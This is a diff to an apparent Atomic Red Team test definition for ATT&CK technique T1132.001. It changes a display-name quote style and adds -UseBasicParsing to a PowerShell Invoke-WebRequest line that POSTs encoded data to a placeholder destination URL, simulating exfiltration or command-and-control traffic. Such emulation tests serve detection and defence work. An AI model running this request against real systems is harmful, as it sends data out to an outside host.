@@ -1,5 +1,5 @@
 attack_technique: T1132.001
-display_name: 'Data Encoding: Standard Encoding'
+display_name: "Data Encoding: Standard Encoding"
 atomic_tests:
 - name: Base64 Encoded data.
   auto_generated_guid: 1164f70f-9a88-4dff-b9ff-dc70e7bf0c25
@@ -80,5 +80,5 @@ atomic_tests:
       }
       $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)
       [System.Net.ServicePointManager]::Expect100Continue = $false
-      Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive
+      Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive -UseBasicParsing
     name: powershell
